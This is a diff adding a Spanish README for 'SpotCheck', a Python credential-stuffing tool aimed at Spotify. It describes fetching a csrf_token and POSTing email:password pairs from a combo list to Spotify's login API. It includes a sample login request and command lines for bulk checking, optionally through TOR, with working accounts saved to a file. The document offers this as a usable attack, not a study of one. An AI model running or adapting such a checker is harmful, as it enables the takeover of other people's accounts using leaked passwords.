@@ -12,4 +12,58 @@ no_ssl_socket = socks.socksocket()
 ssl_socket = ssl.wrap_socket(no_ssl_socket, ssl_version=ssl.PROTOCOL_SSLv23)
 ssl_socket.connect(('accounts.spotify.com', 443))
 ssl_socket.sendall(b'GET / HTTP/1.1\r\nHost: accounts.spotify.com\r\n\r\n')
+```    
+El funcionamiento interno de SpotCheck es sencillo. Se realiza un *GET* a **accounts.spotify.com** para conseguir la *csrf_token*, la cual nos ayudara a tener acceso a la API de autentificación de Spotify: **accounts.spotify.com/api/login**. La API de autentificación se puede ver en el AJAX de Spotify (Publico).  
+
+Parte de código de Spotify (https://accounts.scdn.co/js/index.5b565fd7cb445ad46542.js):  
+```javascript
+var o=n({method:"POST",url:"/api/login",data:r,headers:{"Content-Type":"application/x-www-form-urlencoded"},transformRequest:u.objToFormData})
 ```
+  Una vez conseguida la *csrf_token* se realizara un *POST* a la API **accounts.spotify.com/api/login**.
+   
+   Ejemplo de *POST* a la API:  
+ 
+ ```
+POST /api/login HTTP/1.0
+Host: accounts.spotify.com
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4
+Accept: application/json, text/plain
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 80
+Cookie: fb_continue=https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F; sp_landing=play.spotify.com%2F; sp_landingref=https%3A%2F%2Fwww.google.com%2F; user_eligible=0; spot=%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D; sp_t=ac1439ee6195be76711e73dc0f79f894; sp_new=1; csrf_token=<token>; __bon=MHwwfDE1MTEzNzE0OTl8NjM0Nzc2MDI5NTh8MXwxfDF8MQ==; remember=true@true.com; _ga=GA1.2.153026989.1498061376; _gid=GA1.2.740264023.1498061376
+
+remember=true&username=test@test.com&password=thisisatest1234&csrf_token=<token>
+ ```
+ 
+ ## ¿Utilización?
+ 
+ Ya que SpotCheck es un script automatizado su uso es muy sencillo.
+ Los argumentos obligatorios son:
+ 
+ ### combo
+ ### output
+ 
+ Estos dos argumentos determinan el fichero donde se tienen listas y emails en formato combo (email:password) y el archivo donde se almacenaran las cuentas que funcionen correctamente.
+ 
+ Argumentos opcionales:
+ 
+ ### --tor
+ Si es especifica este argumento en el comando de ejecución de SpotCheck obligara al programa a realizar las peticiones a traves de TOR. (Impacto en el rendimiento)
+ 
+ ### --nothreads
+  Si es especifica este argumento en el comando de ejecución de SpotCheck obligara al programa a chequear las cuentas en el proceso principal de SpotCheck (Impacto en el rendimiento)
+  
+  ## Ejemplo de uso sin TOR
+  ```
+  python SpotCheck.py combo.txt accounts.txt
+  ```
+  
+  ## Ejemplo de uso con TOR
+  ```
+  python SpotCheck.py combo.txt accounts.txt --tor
+  ```
+  
+  ## Ejemplo de uso sin threads
+   ```
+  python SpotCheck.py combo.txt accounts.txt --nothreads
+  ```
